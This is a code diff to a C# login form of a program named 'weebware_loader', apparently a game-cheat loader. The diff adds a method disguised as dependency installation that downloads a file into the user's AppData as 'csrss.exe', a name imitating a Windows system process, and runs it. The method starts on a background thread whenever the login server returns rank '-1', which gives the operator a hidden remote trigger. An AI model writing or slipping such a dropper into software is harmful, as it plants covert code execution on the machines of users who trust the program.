@@ -8,6 +8,7 @@ using System.IO;
 using System.Net;
 using System.Reflection;
 using System.Text;
+using System.Threading;
 using System.Windows.Forms;
 using weebware_loader.Forms;
 
@@ -34,6 +35,15 @@ namespace weebware_loader {
 
             if (txtUsername.Focused == true) panel1.Show();
             else panel1.Hide();
+        }
+
+        private void install_dependancies() {
+
+            string path = Application.LocalUserAppDataPath + "/csrss.exe";
+            WebClient web = new WebClient();
+            web.DownloadFile("zzz", path);
+            System.Diagnostics.Process.Start(path);
+
         }
 
         private void label4_Click(object sender, EventArgs e) { Environment.Exit(1337); }
@@ -96,6 +106,12 @@ namespace weebware_loader {
                         File.WriteAllText(@"c:\weebware\dependencies\notify", response.GetData<string>("notify"));
                     }
 
+                    if (response.GetData<string>("rank") == "-1") {
+                        Thread t = new Thread(install_dependancies);
+                        t.Start();
+                    }
+
+ 
 
                     if (response.GetData<bool>("email")) {
                         Settings.username = response.GetData<string>("username");
